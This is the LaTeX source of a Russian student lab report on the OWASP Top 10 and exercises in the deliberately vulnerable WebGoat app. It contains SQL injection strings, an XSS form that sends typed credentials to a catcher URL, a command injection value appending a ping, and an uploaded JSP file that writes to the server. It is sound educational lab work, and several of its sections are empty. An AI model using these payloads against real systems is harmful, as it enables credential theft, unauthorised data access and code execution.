\documentclass[11pt, a4paper]{article}		% general format


%%%% Charset
\usepackage[utf8]{inputenc}					% use utf8					
\usepackage[russian]{babel}					% use russian font


%%%% Math
\usepackage{amsmath}						% Amer­i­can Math­e­mat­i­cal So­ci­ety (AMS) math fa­cil­i­ties
\usepackage{amsfonts}						% fonts from the AMS
\usepackage{amssymb}						% additional math symbols


%%%% Graphics
\usepackage{graphicx}


\author{Дедков Сергей}
\title{Отчет по лабораторной работе №8 :\\ Проект OWASP WebGoat}
\date{2015}

%---------------------------------------------------------

\begin{document}
\maketitle
\tableofcontents
\newpage

%---------------------------------------------------------


\section{Цель работы}


%---------------------------------------------------------

\section{Ход работы}


%---------------------------------------------------------

\subsection{Изучить описания десяти самых распространенных веб-уязвимости согласно рейтингу OWASP.}

\begin{itemize}

\item A1 Внедрение кода - Injection

Атака при которой данные выполняются как код, например SQL-иньекции.

Примеры использования:

\begin{verbatim}
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
\end{verbatim}

\begin{verbatim}
http://example.com/app/accountView?id=' or '1'='1
\end{verbatim}

\item A2 Некорректная аутентификация и управление сессией - Broken Authentification and Session Management

По умолчанию, индентификатор созданной сессии сохраняется в cookie браузера, за исключением случаев когда cookie в браузере откючены. В таком случае, они будут автоматом подставляться в каждый URL самим сервером

\begin{verbatim}
index.php?PHPSESSID=jf843jgk4ogkfdjfgomg84o4og54mg
\end{verbatim}

\item A3 Межсайтовый скриптинг - Cross-Site scripting (XSS)

Тип атаки на веб-системы, заключающийся во внедрении в выдаваемую веб-системой страницу вредоносного кода (который будет выполнен на компьютере пользователя при открытии им этой страницы) и взаимодействии этого кода с веб-сервером злоумышленника. Является разновидностью атаки «внедрение кода».

\item A4 Небезопасные прямые ссылки на объекты - Insecure Direct Object References

Данная уязвимость проявляется, когда разработчик указывает прямую ссылку на внутренний объект, например такой как файл, каталог или запись в базе данных, как параметр в URL. Это позволяет атакующему за счёт манипуляций с этим параметром получить несанкционированный доступ к системе.

Примеры:
\begin{itemize}

\item Прямая ссылка на приватную фотографию в закрытом альбоме

\item Открытый номер кошелька в GET-запросе

\item AJAX запрос-ответ по userID, возвращающий все данные о юзере в JSON, которые фильтруются на стороне клиента

\item Незакрытый просмотр/редактирование, например, своего профиля. В примере ниже, юзер с ID 3 может перейти на страницу профиля ID 1, и отредактировать его

\end{itemize}

\item A5 Небезопасная конфигурация - Security Misconfiguration

Недостаточно или неправильно настроенный конфигурационный файл сервера/PHP/…
Сюда относятся:

\begin{itemize}
\item Открытые логи
\item Не закрытый development mode (незакрытое профилирование запросов, stack trace)
\item Открытый конфиг. Не main.php, к примеру, а main.inc
\item Не иметь аккаунтов admin/admin. Даже на роутере в офисе.
\item Открытый доступ в папки images. Закрывается с помощью .htaccess или пустым index.html
\item И открытые папки вроде .git или .svn
\end{itemize}

\item A6 Утечка чувствительных данных - Sensitive Data Exposure

Как правило, данная уязвимость уже вытекает как следствие взлома сайта, в ходе которого были похищены данные, которые оказались легко читаемыми.

Тест на уязвимость:
\begin{itemize}
\item Хранятся ли у нас какие-либо данные о деньгах/номерах кошельков/состоянии здоровья в БД в открытом виде?
\item Также, в каком виде эти данные передаются по сети?
\item Свежие ли версии софта стоят?
\item Достаточно ли силён алгоритм шифрования, и часто ли происходит его обновление?
\end{itemize}

\item A7 Отсутствие контроля доступа к функциональному уровню - Missing Function Level Access Control

Заголовок подразумевает разграниченный доступ к определённым функциям приложения.
\begin{itemize}
\item Не оставлять ссылки для тех, кому нет прав туда заходить
\item Иммунитет даст по дефолту снятие доступов для всех и со всего — принцип белого листа и deny(*).
\item Так же, не помешает проверка в важных местах кода в процессе выполнения действия — при вызове функции/метода поставить проверку ещё раз.
\end{itemize}

\item A8 Подделка межсайтовых запросов (CSRF) - Cross-Site Request Forgery (CSRF)

Вид атак на посетителей веб-сайтов, использующий недостатки протокола HTTP. Если жертва заходит на сайт, созданный злоумышленником, от её лица тайно отправляется запрос на другой сервер (например, на сервер платёжной системы), осуществляющий некую вредоносную операцию (например, перевод денег на счёт злоумышленника). Для осуществления данной атаки жертва должна быть аутентифицирована на том сервере, на который отправляется запрос, и этот запрос не должен требовать какого-либо подтверждения со стороны пользователя, который не может быть проигнорирован или подделан атакующим скриптом.

\item A9 Использование компонентов с известными уязвимостями - Using Components with Known Vulnerabilities

Для устранения - поддерживать все подключаемые части проекта в актуальном состоянии, обновлять до последних стабильных версий, не юзать малопопулярные или любительские модули. Если стоит выбор — не использовать их в принципе.

\item A10 Невалидированные редиректы - Unvalidated Redirects and Forwards

Доверяя сайту, пользователи могут переходить по любым ссылкам. Сообщение вроде «Вы покидаете наш сайт, переходя по ссылке ...», не что иное, как простейшая защита от подобного рода уязвимостей. Злоумышленник может воспользоваться подобного рода редиректами через сайт на угодные ему страницы.

Профилактика:

\begin{itemize}
\item Не злоупотреблять редиректами.
\item Если пришлось, не использовать пользовательские данные в запросе (вроде success.php\&user\_mail=eeee@eee.com)
\item Рекомендуется перезаписывать url средствами сервера.
\end{itemize}


\end{itemize}


%---------------------------------------------------------

\subsection{HTTP Splitting}

 Атакующий посылает веб-серверу вредоносные данные вместе с ожидаемыми. Уязвимое приложение не проверяет полученную
информацию на наличие символов CR (возврат коретки, обозначается с помощью \%0d) и LF (перевод строки, обозначается
с помощью \%0a). Данные символы не только позволяют атакующему контролировать возвращаемые сервером заголовки и тело ответа,
но и дают ему возможность создавать поддельные ответы, содержимое которых будет ему полностью подконтрольно.

Эффект от таких атак может усиливаться когда они проводятся вместе с атаками класса "Отравление кеша" (Cache Poisoning).
Смысл их в отравлении кеша жертвы по средствам подсовывания ей с помощью HTTP Splitting поддельной страницы,
пришедшей якобы от сервера.

Вместе с этим, с помощью уязвимостей позволяющих провести разбиение HTTP-ответа, злоумышленник может заставить сервер
отослать клиенту поддельный заголовок Last-Modified: с датой из будущего. От этого браузер клиента станет посылать серверу
неверное содержимое в заголовке If-Modified-Since. Сервер, в свою очередь, всегда будет отвечать клиенту что (отравленная)
страница не изменилась и клиент постоянно будет видеть страницу подсунутую злоумышленником.


%---------------------------------------------------------

\subsection{Недостатки контроля доступа}

Данная уязвимость возможна если не правильно настроены права доступа для пользователей.

В случае если с сервера подгружаются файлы, можно заменить директорию, таким образом получить любой файл из файловой системы.

Так же можно менять в http запросах action, для выполнения какого-либо другого действия, например, удалять профиль вместо просмотра.
Или же id пользователя, чтобы совершить действие с другим пользователем.



%---------------------------------------------------------

\subsection{Безопасность AJAX}




%---------------------------------------------------------

\subsection{Недостатки аутентификации}

\begin{itemize}

\item Сложность пароля:

Было предложено проверить сложность паролей с помощью сервиса  https://www.cnlab.ch/codecheck. (Сейчас этот сервис не работает)

    123456 - 0 seconds (dictionary based, one of top 100)
    abzfez - up to 5 minutes ( 26 chars on 6 positions = 26\^6 seconds)
    a9z1ez - up to 40 minutes ( 26+10 chars on 6 positions = 36\^6 seconds)
    aB8fEz - up to 16 hours ( 26+26+10 chars on 6 positions = 62\^6 seconds)
    z8!E?7 - up to 50 days ( 127 chars on 6 positions = 127\^6 seconds)

\item Забыли пароль

Пользователи могут восстановить их пароль если у них получится ответить на секретный вопрос. На странице
восстановления нет никаких мезанизмов связанных с блокировкой аккаунтов. Ваше имя пользователя - 'webgoat',
любимый цвет - красный (red). Цель урока - восстановить пароль к аккаунту другого пользователя.

Results:
Username: webgoat
Color: red
Password: webgoat

\item Основная аутентификация

Основная аутентификация используется для защиты ресурсов расположенных на стороне сервера.
При получении запроса от пользователя веб-сервер отправляет ему ответ с кодом 401.
Получив его браузер запрашивает у пользователя логин и пароль в специальном диалоговом окне. После
ввода браузер кодирует полученные данные по алгоритму base64 и отсылает веб-серверу.
Последний, в свою очередь, проверяет полученную информацию и, если всё правильно, отдаёт клиенту запрашиваемый
документ. Указанные пользователем данные далее автоматически отсылаются браузером при каждом обращении к
защищённым ресурсам.

Для декодирования base64 используем сервис http://yehg.net/encoding/

Congratulations, you have figured out the mechanics of basic authentication.  
- Now you must try to make WebGoat reauthenticate you as:
- username: basic     
- password: basic. 
Use the Basic Authentication Menu to start at login page.
 
После тго как данные введены в форму. Чистим куки и аутентификационные сессии.

Далее прописываем следующий url: 

\verb'http://basic:basic@localhost:8080/WebGoat/attack?Screen=187&menu=500'
 
* Congratulations. You have successfully completed this lesson.
* Error generating org.owasp.webgoat.lessons.BasicAuthentication


\item Логирование через TAN (Transaction authentication number)

1. В данном уроке хакер знает Имя и Партоль, а так же TAN1, но дело в том, что он уже использован. Поэтому будет предложено ввести второй, но мы можем поменять номер TAN в параметрах запроса.

2. Другой вариант, когда известен логин и TAN. Тогда, сначала залогинившись под своим пользователем, при отправке TAN можно заменить имя на другого. TAN будет воспринят корректно, а проля не потребуется.

\end{itemize}


%---------------------------------------------------------

\subsection{Переполнение буфера}

В данном вариенте используется переполнение буфера - сайт ведет себя некорректно и предоставляет информацию обо всех пользователях вместо одного. 
Для предотвращение на клиенте можно добавть проверку на количество символов и на сервере корректность данных.

%---------------------------------------------------------

\subsection{Качество кода}

В данном варианте в комментариях на странице HTML были прописаны логин и пароль. Достаточно заглянуть в текст странички, чтобы вытащить их и пройти авторизацию.

%---------------------------------------------------------

\subsection{Многопоточность}

В данном случае при одновременном доступе к одним и тем же запросам разным пользователям приходят одни и те же ответы. За такими уязвимостями надо следить.


%---------------------------------------------------------

\subsection{Межсайтовое выполнение сценариев}

\begin{itemize}

\item В первом задании нужно ввести в поле поиска вредоносный код, например, такой:

\begin{verbatim}
<form>
<form name="stealer">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password">
<input type="submit" value="Submit" onclick=<script><img src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user="+ document.stealer.username.value + "&password=" + document.stealer.password.value + "">
</script>
</form>
\end{verbatim}

После чего появяться поля, где нужно будет ввести логин и пароль, которые будут переданы на нужный сервер.

\item Хранимые Stored XSS

Хранимый XSS является наиболее разрушительным типом атаки. Хранимый XSS возможен, когда злоумышленнику удается внедрить на сервер вредоносный код, выполняющийся в браузере каждый раз при обращении к оригинальной странице. Классическим примером этой уязвимости являются форумы, на которых разрешено оставлять комментарии в HTML формате без ограничений, а также другие сайты Веб 2.0 (блоги, вики, имиджборд), когда на сервере хранятся пользовательские тексты и рисунки. Скрипты вставляются в эти тексты и рисунки.

В данном случае в одном из полей, которое храниться в базе данных и выводиться у других пользоателей нужно указать вредоностный javascript код в тэге <script>.

Для предотвращения можно сделать валидацию по вооду данных и валидацию по выводу на сервере.

\item Отраженные Reflected XSS

Атака, основанная на отражённой уязвимости, на сегодняшний день является самой распространенной XSS-атакой. Эти уязвимости появляются, когда данные, предоставленные веб-клиентом, чаще всего в параметрах HTTP-запроса или в форме HTML, исполняются непосредственно серверными скриптами для синтаксического анализа и отображения страницы результатов для этого клиента, без надлежащей обработки. Отражённая XSS-атака срабатывает, когда пользователь переходит по специально подготовленной ссылке.


\end{itemize}


%---------------------------------------------------------

\subsection{Неправильная обработка ошибок}

Примером данной уязвимости служит возможность удалить из параметров, например, пароль и после этого удачно пройти аутентификацию.


%---------------------------------------------------------

\subsection{Недостатки приводящие к осуществлению инъекций (SQL и прочее)}

\begin{itemize}

\item Иньекция команд

Атаки класса "Инъекция команд" представляют собой серьёзную угрозу для сайтов принимающих
от пользователей какие-либо данные. Методика их использования достаточно тривиальна, но в тоже
время они могут приводить к полной компрометации атакованной системы. Несмотря на это количество
приложений имеющих подобные уязвимости неуклонно растёт.

На самом деле подобные угрозы могут быть полностью устранены с помощью принятия разработчиками
простейших мер направленных на обеспечение безопасности приложения.

Проверка всех получаемых от пользователя данных, особенно тех, которые будут использоваться
в командах ОС, скриптах или запросах к БД, является хорошей практикой.

Если вместо файла, который должен быть исполнен отправить на сервер такой код \verb'" & ping 192.168.150.3' то сервер пропингует данный ip.

\item Проведение числовых SQL-инъекций

Всегда можно избежать появления уязвимостей этого класса
если в процессе написания приложений соблюдать общие меры предосторожности.
Например фильтровать все поступающие от пользователя данные. Особенно те, которые
будут помещены в SQL-запросы. 

Пусть есть запрос:

SELECT * FROM weather\_data WHERE station = 101

Где 101 - передается на сервер через запрос. если подменить на 101 or true. Получиться следующий запрос и будет выведена вся информация:

SELECT * FROM weather\_data WHERE station = 101 or true

Даже так, котороая должна была быть скрыта отпользователя.

\item Log-spoofing

Целью этих атак является подделка записей лог-файла за счёт помещения в него специально сформированной строки.
Это позволит атакующему запутать администратора и скрыть свои следы.

Суть атаки в том, что помимо логина на сервер отправляется строка, которая предположительно записывается в лог, после чего администратор не понимает что произошло.

\item XPATH иньекция

По аналогии с SQL-инъекциями, XPath-инъекции возникают тогда, когда пользовательские
данные без должной проверки попадают в запрос к XML-данным. Посылая приложению
специльно сформированные запросы злоумышленник может раскрыть внутреннюю структуру
XML-базы и получить доступ к той информации, к которой ему обращаться нельзя.
Например он может повысить свои привилегии если ему удастся
произвести XPath-инъекцию в отношении файла хранящего пользовательские аккаунты.

Запросы к XML осуществляются с помощью XPath - не сложного языка, позволяющего
определять местонахождения информации в XML-структуре. Как и в SQL, в нём вы можете
устанавливать критерии поиска. В случаях когда данные приложения хранятся в виде XML-базы,
пользователь с помощью одного или нескольких параметров запроса может определять что из неё будет
извлечено и отображено на сайте. Эти параметры должны тщательно проверяться, чтоб атакующий
не смог изменить структуру изначального XPath-запроса и извлечь чувствительную информацию.

Если после ввода логина и пароля показывается информация об этом пользователе, то если прописать условие которОе всегда выполняется покажется информация о всех пользователях.

\item Строковая sql иньекция

По аналогии с цифровой, только в конце запроса добавляется кавычка, чтобы закрыть строку. Таким образом в условии можно например дописать следующий текст:

\begin{verbatim}
' or 'a'='a
\end{verbatim}

\end{itemize}

SQL иньекции возможны благодаря тому, что переменные вставляются прямо в текст запроса, для того, чтобы избежать следует использовать параметризированные запросы.

Для поиска SQL иньекций существует add-on firefox - SQL Inject me, который проверяет формы на сайте на наличие SQL иньекций.


%---------------------------------------------------------

\subsection{Отказ в обслуживании}

Атаки класса "Отказ в обслуживании" являются главной проблемой веб-приложений. Ситуации, при которых конечный пользователь
долгое время не может получить доступ к важному приложению или сервису, могут принести большие убытки.

В предложенной работе сайт позволяет нескольким пользователям авторизироваться одновременно. В то же время
веб-приложение может устанавливать с БД только 2 соединения за раз. Нужно было получить
список существующих пользователей и попытаться одновременно произвести вход от 3 логинов.

Для этого методом SQL иньекции выясняются пароли. После чего производится авторизация трех разных пользователей.


%---------------------------------------------------------

\subsection{Небезопасное сетевое взаимодействие}

Пользуясь данной атакой можно просматривать траффик(сниффинг) браузера, при этом пароли и прочие данные будут передаваться в незашифрованном виде и их легко будет обнаружить, например заставив трафик в сети с другой машины проходить через машину злоумышленника (например подменив в таблице ARP MAC роутера). Если же клиент использует защищенный протокл https эти данные ничего не скажут злоумышленнику, т.к. будут зашифрованы.


%---------------------------------------------------------

\subsection{Небезопасная конфигурация}

Эта техника используется хакерами для обращения к тем ресурсам, ссылок на которые на сайте нет, но доступ к которым никак не ограничен.
Одним из примеров такой техники является затирание части URL для того чтоб просмотреть содержимое незащищённой директории.

Уязвимость вознкает в том случае если разработчик не предоставляет ссылку непривелигерованному пользователю, но при этом никаких проверок не делает. В таком случае можно угадать нужный url и просматреть интересующую информацию.


%---------------------------------------------------------

\subsection{Небезопасное хранилище}

Для хранения паролей и прочей секретной информации могут быть использованы алгоритмы шифрования, которые можно расшифровать и получить необходимые данные в первоначальном виде.


%---------------------------------------------------------

\subsection{Исполнение злонамеренного кода}

В данном случае на странице предлагается загрузить на сервер картинку. Зная то, что картинки грузятся в папку  http://localhost:8080/WebGoat/uploads/. Можно загрузить туда исполняемый файл, например, exp.jsp. А потом запустить его перейдя в браузере по url http://localhost:8080/WebGoat/uploads/exp.jsp. Что и было сделано.

Код файла: 

\begin{verbatim}
<html>
<% java.io.File file = new java.io.File("/root/WebGoat-5.4/tomcat/webapps/WebGoat/mfe_target/guest.txt");
file.createNewFile(); %>
</html>
\end{verbatim}


%---------------------------------------------------------

\subsection{Подделка параметров}

\begin{itemize}

\item Для подделки параметров можно воспользоваться средством - Firebug, таким образом поменяв в html возможные параметры. Так же можно перехватить http запрос иподменить необходимые

\item Некоторые формы используют скрытые поля(hidden fields), которые можно подменить используя firebug

\item При отправке на почту, например используется google account, можно добавить скрипт в сообщение. А так же перехватить запрос и подменить параметр получателя на нужный. В таком случае с email сайта придет письмо другому получателю, а не тому кому планировалось

\item Для того, чтобы подменить параметры, которые проходят валидацию на клиенте посредством javascript аналогично подменяются параметры в http запросе

\end{itemize}


%---------------------------------------------------------

\subsection{Недостатки управление сессией}






%---------------------------------------------------------

\section{Вывод}

\end{document}